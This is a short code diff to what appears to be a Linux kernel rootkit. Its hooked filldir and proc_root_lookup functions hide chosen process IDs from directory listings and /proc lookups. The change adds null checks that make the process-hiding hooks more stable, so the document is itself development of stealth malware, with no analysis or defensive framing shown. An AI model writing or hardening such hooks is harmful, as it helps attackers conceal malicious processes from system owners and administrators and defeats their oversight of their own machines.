@@ -102,9 +102,11 @@ static int hooked_filldir(struct dir_context *ctx, const char *name, int namlen,
     char *endptr;
     long pid;
 
-    pid = simple_strtol(name, &endptr, 10);
-    if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
-        return 0; // Skip this entry
+    if (name) {
+        pid = simple_strtol(name, &endptr, 10);
+        if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
+            return 0; // Skip this entry
+        }
     }
 
     return hooked_ctx->original_ctx->actor(hooked_ctx->original_ctx, name, namlen, offset, ino, d_type);
@@ -152,11 +154,14 @@ static struct dentry * hooked_proc_root_lookup(struct inode *dir, struct dentry 
 {
     char *endptr;
     long pid;
-    const char *name = dentry->d_name.name;
+    const char *name;
 
-    pid = simple_strtol(name, &endptr, 10);
-    if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
-        return ERR_PTR(-ENOENT);
+    if (dentry && dentry->d_name.name) {
+        name = dentry->d_name.name;
+        pid = simple_strtol(name, &endptr, 10);
+        if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
+            return ERR_PTR(-ENOENT);
+        }
     }
 
     original_proc_root_lookup = (void*)p_proc_root_lookup_hook.stub->orig;
